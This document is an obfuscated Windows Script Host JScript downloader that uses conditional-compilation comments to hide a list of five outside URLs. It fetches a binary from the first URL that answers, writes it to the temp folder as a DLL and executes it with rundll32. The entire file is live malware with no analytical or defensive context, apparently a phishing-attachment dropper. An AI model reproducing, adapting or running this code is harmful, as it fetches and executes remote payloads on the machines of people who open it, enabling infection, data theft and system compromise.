var Rf0=1;
var Fo6=2;
/*@cc_on
HYp0 = ["http://modernimpex.ro/yxbf410e","http://mobilefashion.sg/z0u1biu","http://manshutang.com/zhiovlon","http://thirlnak.net/84jcbenc","http://scupwail.com/a6lxavss"];
DKz2 = "9gGS9rln";
@*/
var Io2=2;
var LOg6="437";
var Rt1=WScript["CreateObject"]("WScript.Shell");
var Ep6=Rt1.ExpandEnvironmentStrings("%T"+"EMP%/");
var PSt9=Ep6 + DKz2;
var BLv2=PSt9 + ".d" + "ll";
var Qo3 = Rt1["Environment"]("System");
if (Qo3("PROCESSOR_ARCHITECTURE").toLowerCase() == "amd64")
{
var YUr2 = Rt1.ExpandEnvironmentStrings("%SystemRoot%\\SysWOW64\\rundll32.exe");
}
else
{
var YUr2 = Rt1["ExpandEnvironmentStrings"]("%SystemRoot%\\system32\\rundll32.exe");
}
var Vd2=["MSXML2.XMLHTTP", "WinHttp.WinHttpRequest.5.1"];
for (var Gj3=0; Gj3 < Vd2["length"]; Gj3++)
{
try
{
var Ha9=WScript["CreateObject"](Vd2[Gj3]);
break;
}
catch (e)
{
continue;
}
};
var HEe1 = new ActiveXObject("Scripting.FileSystemObject");
function RUt2()
{
var UYx3 = HEe1.GetFile(BLv2);
return UYx3.ShortPath;
}
var PHp6 = 0;
for (var RCc1 = 0; RCc1 < HYp0.length; RCc1 = RCc1 + 1)
{
try
{
Ha9["open"]("GET", HYp0[RCc1], false);
Ha9["send"]();
while (Ha9.readystate < 4) WScript["Sleep"](100);
var NLb5=this["WScript"]["CreateObject"]("ADODB.Stream");
NLb5["open"]();
NLb5.type=Rf0;
/*@cc_on
NLb5.write(Ha9.ResponseBody);
NLb5.position=0;
NLb5['Sav'+'eT'+'oFile'](BLv2,    Io2);
NLb5.close();
var IPc2 = RUt2();
var d = new Date();
d.setFullYear("2015");
Rt1["Run"](YUr2 + " " + IPc2 + ",0004");
@*/
break;
}
catch (e) {continue;};
}
WScript.Quit(0);